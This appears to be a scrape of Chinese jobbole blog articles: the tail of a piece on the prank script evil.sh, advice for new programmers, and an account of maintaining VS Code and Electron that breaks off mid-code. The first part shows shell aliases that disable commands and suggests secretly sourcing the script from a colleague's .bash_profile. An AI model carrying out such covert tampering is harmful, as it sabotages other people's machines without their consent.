class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias unalias=false;\r\nalias alias=false;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b3bf735342376-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b10e03b3bf735342376-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b3bf735342376-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">unalias</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b10e03b3bf735342376-2\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">alias</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<blockquote><p>学习课堂：</p>\n<p>将 <code>alias</code> 和 <code>unalias</code> 别名为 <code>false</code>，那你就不能执行 <code>alias</code> 的功能了。</p></blockquote>\n<h3 id=\"toc_21\">让我回到真实的世界吧！</h3>\n<p>好了，我已经受够了这个疯狂是世界了。其实，上面这些别名，都是可以通过输入命令的全路径来绕开别名的——只是一般人不会这样输入。</p>\n<p>想要整蛊你的同事，那就将这个脚本（<a href=\"https://github.com/mathiasbynens/evil.sh/blob/master/evil.sh\">https://github.com/mathiasbynens/evil.sh/blob/master/evil.sh</a> ）放到他的机器上，并在他的 <code>.bash_profile</code> 的末尾加入 <code>source ~/evil.sh</code> 即可。当然，你要这么做之前，要有友尽的心理准备。</p>\n<p>感谢这个邪恶的脚本的贡献者： Mathias Bynens 和 Jan Moesen 等人 ;-D</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111312\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111312votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111312\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "fav_nums": 7, "comment_nums": 2, "create_date": "2017/05/29", "praise_nums": 1}
{"tags": "程序员, 3 评论 ,开发", "front_image_path": "full/867a1e09a3aff5cf84b574af36a9f2695aedd9c8.jpg", "title": "我想对所有新手程序员说些肺腑之言", "url_object_id": "73efeb8ce5c3c14349fe3817c6ed1e7f", "url": "http://blog.jobbole.com/102337/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/aoi\">伯小乐</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://josephg.com/blog/what-i-tell-all-new-programmers/\">Joseph Gentle</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：Joseph Gentle 是 ShareJS 的作者，前 Google Wave 工程师。在编程经验有 20 年，开课六七门，授课时长大约一千小时。本文是他在 2014 年所写。</p>\n<p><img class=\"alignnone\" src=\"http://ww3.sinaimg.cn/large/7cc829d3gw1esx16mwcpvj20sg0jz0v9.jpg\" width=\"1024\" height=\"719\"></p>\n<hr>\n<p>我编程的时间，已超过 20 年了。截至目前，我开的编程入门课，也有六七门了。传授编程的总时间，大约也有 1000 小时了。下面这些话，没有特别的前后顺序，我对自己学员不止说过一次。</p>\n<p id=\"welcometoprogramming\"><strong>欢迎来编程。</strong></p>\n<h3>编程真的很难</h3>\n<p>无论你是多么擅长编程，能拖慢你脚步的唯一因素是你学习和解决问题的能力。随着你的编程愈发提高，你更能体会我这句话了。编程还有个有趣的地方，永远不会觉得枯燥。如果你觉得枯燥，那估计你在什么地方做错了，你应当对在写的代码，做一下抽象，或者优化。</p>\n<h3>编程同样也会是最让你沮丧的事情之一</h3>\n<p>正常的编程经历应该是这样的：尝试解决问题 → 受挫沮丧 → 再努力尝试 → 回退一步 → 灵光乍现 → 最终搞定，程序正常运行。感觉受挫，这实在太正常不过了，不可能完全没有受挫。（随着你的技艺提高，你会挑战更难的问题，这过程还是会遇到受挫。）挫折感让提高解决问题带来的满足感。你得适应挫折感。</p>\n<h3>不管挫折感有多大，总会有解决方案的</h3>\n<p>随着你的技艺提高，对摆脱困境，你会有更强更大的自信。挫折感越大，推倒你解决更难的问题。（如果问题太简单，那就太没趣啦。）</p>\n<h3>当我们还是小孩时，很多事情都做的很糟糕，只是我们没注意到。</h3>\n<p>成年后，把事搞得很糟糕的机会并不多。拥抱这种感受，完全正常。你做的事情，并不是人人都有能力去做的。</p>\n<h3>你还得知道，练习编程的第 1 个小时，和第 10 个小时是截然不同的</h3>\n<p>与第 100 个小时更不一样了。Dan Plan 的博主曾写过一篇文章，说他在练习 1 万小时，他的高尔夫球技极大提升。编程也是同样的道理。（伯乐在线补充：谷歌大牛 Peter Norvig 的观点也类似，请看他的文章《<a href=\"http://blog.jobbole.com/22905/\" target=\"_blank\">自学编程，十年磨一剑</a>》。）</p>\n<h3>你是一个魔术师！</h3>\n<p>编程也是一种魔术。想想看，我们努力学习，从魔法书中汲取知识，然后制作符咒（从计算机书和互联网学习，然后编写程序）。魔术师可以教会魔术师如何施展魔法。我们程序员可以在现实也能做到这些，并且还能创造人人都能用的神奇设备，比如：互联网和移动电话。如果没有我们的技能，不可能有这样的设备。</p>\n<h3>善用互联网</h3>\n<p>在你学习编程的第一年中，你遇到的每个问题，很多在你之前的程序员，早就碰到了。并且网上已有记录好的答案了。你使用搜索引擎的效率越高，你会更高兴。<strong>警告</strong>：如果你对网上搜到的代码段不理解，那就不要随便就用。</p>\n<h3>不管何时编程，都要随身带着「百宝囊」</h3>\n<p>这些工具是我们干活的诀窍。你要学的第一批东西（变量、循环等），就好比工具箱中的螺丝刀和锤子。在编程生涯中，这些工具是日常必需品。随着经验积累提升后，你开始学习使用更高级的工具（比如：树、A*、valgrind、调试器等），也许这些东西平常用的不多，但在解决特定问题时特别得劲。大多数编程领域（游戏开发、Web开发、数据库）都有各自领域问题及对应的解决方案。因此，你先前解决过的问题，以后遇到时，可以更加轻松应对了。</p>\n<h3>每个程序都是由代码组成</h3>\n<p>你可以在自己电脑上几乎阅读、修改、捣鼓所有东西，还有其他人已写好的程序。说到电脑，它基本上就是一个超级大国，啥都有。</p>\n<h3>提高编程能力的最佳方式，就是多写代码</h3>\n<p>保持做东西、写代码！作为一个老师，我会尽我所能，把你带入门。一旦你技艺达到一定程度后，假以时日，你能解决所有碰到的难题。坚持写代码写下去吧。毕竟李白都说过了：只要功夫深，铁杵磨成针！</p>\n<h3>综合前面 2 点，除了写大量代码，还要读大量代码</h3>\n<p>天外有天，人外有人，这世上比咱们聪明的程序员多的是。他们已经写了很多代码了，或许你就在 GitHub 上就能看到。</p>\n<h3>据说程序员学的第 2 门编程语言是最难的</h3>\n<p>你在学习第 1 门编程语言时，塑造了你的编程思维方式（看我的严肃脸.jpg）。当你在学第 2 门语言时，你必须重新思考之前被定型的东西。（不能打破改变你思维模式的语言，不值得学习。）当你掌握第 2 门语言后，掌握其他新语言会更得心应手。任何一种必要的语言，我用一个周末基本就可以学的差不多。</p>\n<h3>没有最好的编程语言！</h3>\n<p>在解决某些特定问题时，某些语言和工具的确由于其他的。当你学习了其他不同的语言时，那就不要把陈旧的编程思维，移植到新系统上。相反，要习惯用新思维来编程。</p>\n<h3>多玩，多犯傻踩坑！</h3>\n<p>编程好比一个巨型乐高模型，充满了待解决的问题。多花些心思和时间，在这上面添砖加瓦，做些「玩具」程序。这比分派给你的任务会有趣多了。</p>\n<h3>工作之外，优秀的程序也会为自己编程</h3>\n<p>如果你真的擅长这一点，你就永远不会发现自己失业了。</p>\n<h3>遇到问题卡住时，试试在纸上写代码</h3>\n<p>我是认真在说，不是开玩笑。这种方式很神奇，并且是编程竞赛中的标准实践。为什么这种方法有效果，我认为当不用考虑语法问题后，我们有更多脑力去解决实际问题。</p>\n<hr>\n<p>我确信自己时不时地会冒出其他建议。但正如大多数建议，如果是真的很重要的建议，你自己也能想到的。</p>\n<p>编程愉快 :D</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"102337\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"102337votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"102337\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 8 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">伯小乐</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/11/f2bb4f6f428a49476a2e91c355c8d150.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            伯乐在线小编一枚~~~~PS：我不是@小编辑，不要问我了        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/aoi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/aoi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/aoi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 245</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://ww3.sinaimg.cn/large/7cc829d3gw1esx16mwcpvj20sg0jz0v9.jpg"], "fav_nums": 8, "comment_nums": 3, "create_date": "2017/05/27", "praise_nums": 4}
{"tags": "开源,开发", "front_image_path": "full/dd36e1ac9db2af41888b4a17b76a865bb91d4510.jpg", "title": "维护大型开源项目，是怎样的体验？", "url_object_id": "6e848736feb1aa6b38e9193440fdf13a", "url": "http://blog.jobbole.com/111189/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<p>【伯乐在线导读】：开源运动愈发受到互联网科技公司的喜欢，曾经视开源为毒瘤的微软，也都大刀阔斧地拥抱开源了。参与开源的开发者也越来越多，GitHub 的活跃度也佐证了这种现象。国外程序员 Nolan Lawson 在《<a href=\"http://blog.jobbole.com/111153/\" target=\"_blank\">做开源项目的维护者，是怎样一种体验？</a>》分享了他的感受和经验。</p>\n<p>在知乎上也有一个类似的讨论帖：「<a href=\"https://www.zhihu.com/question/36292298\" target=\"_blank\">维护一个大型开源项目是怎样的体验？</a>」。原题主的补充：</p>\n<p>（<span style=\"color: #999999;\">我认为）大型开源项目包含以下任意一个或多个特征：</span></p>\n<ul>\n<li><span style=\"color: #999999;\">GitHub star 数量 1000 +</span></li>\n<li><span style=\"color: #999999;\">每周都可以接收到多个 issues 或 PR</span></li>\n<li><span style=\"color: #999999;\">有一些公司或其他项目在生产环境中使用</span></li>\n<li><span style=\"color: #999999;\">任意一个或多个包管理系统中下载量巨大</span></li>\n<li><span style=\"color: #999999;\">在项目所在领域中拥有较大关注度</span></li>\n</ul>\n<p><span style=\"color: #999999;\">可以从以下几个方面进行回答。</span></p>\n<ul>\n<li><span style=\"color: #999999;\">先介绍你的项目，用来干什么的？</span></li>\n<li><span style=\"color: #999999;\">在开发和维护的过程中遇到过哪些值得一提的事？</span></li>\n<li><span style=\"color: #999999;\">有没有什么奇葩的 issue 或者 PR？</span></li>\n<li><span style=\"color: #999999;\">对你的生活或者工作有没有造成影响（好的，坏的）？</span></li>\n</ul>\n<p>伯乐在线摘编了两位朋友的回答，均已获得授权。</p>\n<h3>1. rebornix 的回答分享（<a href=\"https://rebornix.com/\" target=\"_blank\">link</a>），伯乐在线已获授权</h3>\n<p>加入 <a class=\" wrap external\" href=\"https://code.visualstudio.com/\" target=\"_blank\" rel=\"nofollow noreferrer\">Visual Studio Code – Code Editing. Redefined</a> 快一年，趁这个机会聊一聊开发和维护这个项目的感受，如果大家不反对这是一个 <b>大型</b> 开源项目的话。以下为个人理解，不代表公司也不代表团队。</p>\n<h2><b>项目</b></h2>\n<p>Visual Studio Code 的目标是做一个 Lightweight Editor，通过的扩展 api，让用户在 VS Code 中达到和 IDE 中接近的开发体验（效率）。</p>\n<p>不过很多群众对 VS Code 有诸多误解，我先来一一解答</p>\n<ol>\n<li><i>“VS Code 师出 VS，是 VS 找了一群人来重写的，复用了很多 VS 的代码，等等“。</i>很抱歉，并不是这样<b>，</b>半毛钱关系也没有。VS Code 的核心代码，也就是 <a class=\" wrap external\" href=\"https://code.visualstudio.com/\" target=\"_blank\" rel=\"nofollow noreferrer\">Microsoft/monaco-editor</a> 是 Erich Gamma 2011 年加入微软后，招聘的一支“<i>全新</i>”的队伍进行开发的。Monaco editor 从一开始就是一个 browser based editor，早期一直服务于各个微软系统中（比如 Visual Studio Online，OneDrive online）。招聘的这支队伍对于 Erich 来说并不是新的，因为大部分成员都是原先 IBM 的老部下，其中几位大爷跟着 Erich 撸了二十多年代码了。</li>\n<li><i>“VS Code 是 Atom 的复刻，是对 Atom 的魔改，是 Atom 的一个主题！”</i>。很抱歉，<b>并不是这样</b>，但还是有几毛钱关系的。Monaco Editor 在经历几年的高光期，进入了一个小小的黑暗时代。这时候团队成员开始调研将 Monaco Editor 做成桌面应用，和 Atom 一样，我们首先关注到的就是 node-webkit。必须说 node-webkit 是业界的一缕清风，给这个产业带来了太多的可能性。当然最后我们选用了 atom-shell，也就是后来的 Electron。但就是这个 atom-shell，给大家带来了以上的误导。</li>\n</ol>\n<p>最后，我们一定要寻根问祖的话，VS Code 应该是师出 Eclipse（<i>同志们，哎你们怎么扭头走人了，别怕，我话没说完呢</i>）。团队核心的几位大爷，早年就跟着 Erich，在写了几个 Editor／IDE 之后，创造了 Eclipse。正是因为见证了 Eclipse 的兴衰，所以这一次在设计 Monaco／VS Code 的时候，才会如此的克制。Extensibility 不好吗？当然好，但是 Eclipse 的弊端已经在一些竞争对手身上出现啦。</p>\n<h2><b>开发／维护</b></h2>\n<p>我 13 年加入微软后，就开始接触到 Monaco 了。在使用的过程中踩了一些坑，研究过代码，做过好一些扩展。所以在 VS Code 正式开源后以及上线 Marketplace 后，我就开始动手写一点插件和发 Pull Request。去年五月得空和团队结对编程了两个礼拜后，就加入了 VS Code。</p>\n<p>VS Code 的开发几乎完全是公开的。早期我们还通过 User Voice 收集反馈，但我们早就把它关掉了，所有问题的处理都放在 GitHub 上。我们的 Yearly/Monthly plan 都以 issue 的形式呈现 <a class=\" wrap external\" href=\"https://github.com/Microsoft/vscode/issues\" target=\"_blank\" rel=\"nofollow noreferrer\">Microsoft/vscode</a> ，而我个人正常的开发节奏是这样的：</p>\n<p><b>计划</b></p>\n<p>在上一个 milestone 快结束、新的 milestone 开始的第一周，和老板沟通新的 milestone 自己想做的功能。以及自己要不要休假。</p>\n<p><b>Debt Week</b></p>\n<p>我们把新 Milestone 的一周当作 debt week，集中处理一些技术债，以及为一些插件做点微小的贡献。我一般会花一点时间在 Vim 插件以及我自己的 Ruby 插件上。</p>\n<p><b>开发</b></p>\n<p>这之后就是两到三周正常的开发。每天起床得先把自己头上的新 issue 都 triage 一遍，遇到紧急的得先修，不然就继续完成自己的 feature。</p>\n<p><b>Inbox Tracking</b></p>\n<p>我加入团队的时候，我们只有 1700 个左右的 issue，现在已经破 4000 了（大部分都是 feature request）。GitHub Inbox 在这种情况下是无用的，我们的做法是每周会有一名同事，负责 GitHub 的新 issue，assign 给合适的 owner。我已经当过三次 Inbox Tracker，只能用可怕来形容。每天一睁眼就是一百多个 issue 要处理，一点都不想起床。</p>\n<p><b>Endgame</b></p>\n<p>我们在 milestone 的最后一周 endgame 会对新 feature 进行各种花样的测试，对这个 milestone 关掉的所有 issue 进行验证。全部完成后，每个成员书写自己负责部分的 release note。最后 Endgame master 会到后台网站发布新的 Stable 版本。</p>\n<h2><b>印象深刻的事</b></h2>\n<p>当之无愧就是《<a class=\" wrap external\" href=\"https://news.ycombinator.com/item?id=13940014\" target=\"_blank\" rel=\"nofollow noreferrer\">VS Code uses 13% CPU when idle due to blinking cursor rendering</a>》。VS Code 是基于 Electron 的，而 Electron 则基于 Chromium。这样的话，Chromium 的锅有时候得我们来背。</p>\n<p>VS Code 里的编辑区域并不是 textarea ，全都是 mock 的，这也是主流做法，Ace、CodeMirror、Atom 无不例外。理由也很简单，要实现Tokenize、高亮、Partial Render、Line Wrap，自己控制渲染肯定是最方便的。为了尽可能模拟 textarea，我们模拟了光标。最开始这个光标的跳动，是通过 JavaScript 来控制光标的 opacity。后来社区给我们贡献了一个 pull request，使用 CSS animation 来调整 opacity。实现上来说肯定是比 JavaScript 版本更优雅，同时也提供了四五种不同的光标跳动的选项。</p>\n<p>但谁知道，Chromium 对于 CSS Animation 是有巨大的坑的。比如你写的 animation 是每秒改变一次 opacity，但是 Chromium 会根据刷新率（比如 60hz）来检测页面上的 animation。虽然我不知道 Chromium 做了什么，但是你可以看到每16ms，Chromium 就会吃掉一点你的 CPU 和 Battery</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffyu81lg44j20go0f2q5f.jpg\"></p>\n<p>真的是一点办法没有。我们起初没有发现这个问题，直到 <a class=\" wrap external\" href=\"https://github.com/broccolijs/broccoli\" target=\"_blank\" rel=\"nofollow noreferrer\">broccoli</a> 的作者 Jo Liss 给我们发了 issue，并且在 Twitter 上爆我们，瞬间就成了 Twitter 上大新闻。连 Miguel de Icaza 都点赞了，真的是。。。</p>\n<p>当时我刚吃完晚饭，但是由于这个事情在我的防区，我只好开电脑 troubleshoot。最后发现是 Chromium 的 bug，开了两年多了，我只好告诉 Jo Liss，这锅我们不背，但是我们会修的。</p>\n<p>结果之后好事者把事情捅到了 HackerNews，瞬间成了当天大新闻，还上了 TheRegister 小报。所有人都开始讨论使用 Browser 技术做桌面应用是不是正确的选择，撕的不亦乐乎。</p>\n<p>你们撕的倒是开心了，我那几天给各种老板解释什么是跳动的光标，忙的跟狗一样。好在后来 Chromium 的 PM lead Paul Irish 留言表示这是他们的 bug，算是完美收官了。</p>\n<h2><b>有没有什么奇葩的 issue 或者 PR？</b></h2>\n<ol>\n<li>你们猜大家看到中文写的 issue 会找谁来翻译？</li>\n<li>有些朋友提交了 PR，根本不管你给的建议，自顾自的更新修改。这样的 PR 根本不可能 merge，但是我们给的尽可能礼貌地建议，有些朋友真的把它们只当成建议。。。</li>\n<li>再一次说到跳动的光标，这个始作俑者是社区的朋友，看起来也是非常 neat 的实现，谁知道就踩了 Chromium 的坑呢。。。</li>\n</ol>\n<p>关于<b>中文 issue</b> 的问题，VS Code contribution guide 写的是比较清楚的，请大家用英文提问。但是鉴于中文用户量巨大，加之人总有英文不够用的时候，VS Code 也会经常看到中文问题。我有这样一些想法：</p>\n<ol>\n<li>写中文我个人觉得问题不大，毕竟 GitHub 是我们几乎唯一的反馈渠道，不能要求用户必须会英文。</li>\n<li>写中文的确增加了我本人的工作量，所以能写英文，还是尽量写。</li>\n<li>但如果你觉得需要严重的 Google Translate 的帮助，我建议还是写中文，并且 cc 我。不然可能翻译出来最后谁也看不明白，或者误解。</li>\n<li>我老板问我，为啥中文 issue 几乎把所有东西都写在标题里，然后 issue 描述留空。我真的不知道该如何回答。如果用中文写 issue，并 cc 我，请保证把reproduce steps 写好，一步一步用中文写清楚，这总没难度吧？</li>\n<li>如果第四步做不到，还要我解决问题，请考虑请我喝啤酒吧。</li>\n</ol>\n<h2><b>生活</b></h2>\n<p>大家都喜欢开源，但开源贡献者大部分时候是在做义务贡献。这么来看在微软搞 VS Code 就是一件愉快的事情，毕竟有人给你付工资让你做 open source。而且再也不用上班搞一套代码，回家之后私下自己在 GitHub 上面逛游，搞别的项目，上班和下班后可以在同一块土地上耕耘。</p>\n<p>当然这样缺点也很明显，就是生活和工作往往难以分开。工作是一周五天，一天八小时，但是 GiHub issue 从来都是 7*24。遇到棘手的问题的时候，很难放任不管，哪怕已经回了家。不过也正是因为项目的特殊性，我们组还是有比较好的 remote 和自由工作时间的文化的。</p>\n<h3>zcbenz 的回答分享（<a href=\"https://www.zhihu.com/question/36292298/answer/102418523\" target=\"_blank\">link</a>），伯乐在线已获授权</h3>\n<p>这次籍着Electron 1.0发布的机会，说说我自己维护两个大型开源项目的经历吧，分别是 <a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/nwjs/nw.jsnode-webkit\" target=\"_blank\" rel=\"nofollow noreferrer\">node-webkit<i class=\"icon-external\"></i></a>（也就是现在的NW.js）和<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/electron/electron\" target=\"_blank\" rel=\"nofollow noreferrer\">Electron<i class=\"icon-external\"></i></a>。</p>\n<p>前者是几年前自己单打独斗，在公司0资源投入的情况下从两百多star一直做到好几千star，具体数字已经忘掉了，只记得当时在C++项目排行里做到了前十，直到自己另起炉灶。而后者，则是披着GitHub的光环，有着公司热心的投入，毫无障碍一路跑到了现在的三万多star。</p>\n<p style=\"text-align: center;\">（使用<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=http%3A//www.timqian.com/star-history/\" target=\"_blank\" rel=\"nofollow noreferrer\">Star History<i class=\"icon-external\"></i></a>生成的star数统计图）</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ffyu84g4utj20go0bejse.jpg\"><br>\n<b>一切从node-webkit开始</b></p>\n<p>如果大家有接触过前端或者桌面端的开发，那么很可能有听说过NW.js的大名，node-webkit就是其改名之前的称呼。</p>\n<p>但绝大部分人可能并不知道，node-webkit在最初发布的时候（2011年），并不是面向开发桌面应用程序，而是一个Node.js模块，可以创建一个WebKit窗口。神奇的一点是，你可以在这个窗口的页面里调用Node.js的模块。</p>\n<p>Node.js代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd5720e27c614396822\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvar nwebkit = require('nwebkit')\r\nnwebkit.init({'url' : 'index.html'}, function () {\r\n  nwebkit.context.runScript('')\r\n})</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd5720e27c614396822-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd5720e27c614396822-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd5720e27c614396822-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd5720e27c614396822-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd5720e27c614396822-1\"><span class=\"crayon-t\">var</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nwebkit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">require</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'nwebkit'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd5720e27c614396822-2\"><span class=\"crayon-v\">nwebkit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">init</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">{</span><span class=\"crayon-s\">'url'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'index.html'</span><span 